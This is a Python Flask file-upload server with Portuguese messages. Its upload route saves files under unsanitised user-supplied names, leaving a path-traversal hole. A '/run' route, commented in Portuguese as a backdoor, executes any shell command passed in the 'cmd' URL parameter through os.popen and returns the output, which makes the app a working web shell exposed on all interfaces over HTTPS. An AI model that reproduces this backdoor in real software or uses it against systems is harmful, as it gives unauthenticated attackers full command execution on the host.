from flask import Flask, request, render_template, send_from_directory
import os

app = Flask(__name__)

UPLOAD_FOLDER = 'upload'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return 'Nenhum arquivo enviado!'
    file = request.files['file']
    if file.filename == '':
        return 'Nome de arquivo vazio!'
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
    file.save(filepath)
    return f'Arquivo {file.filename} salvo com sucesso em {filepath}'

# Permite download de arquivos da pasta de upload
@app.route('/upload/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# Backdoor: execução remota via parâmetro da URL
@app.route('/run')
def run():
    cmd = request.args.get('cmd')
    if cmd:
        output = os.popen(cmd).read()
        return f"<pre>{output}</pre>"
    return 'Use ?cmd=comando_para_executar'

if __name__ == '__main__':
    app.run(ssl_context=('certs/server.crt', 'certs/server.key'), port=443, host='0.0.0.0')
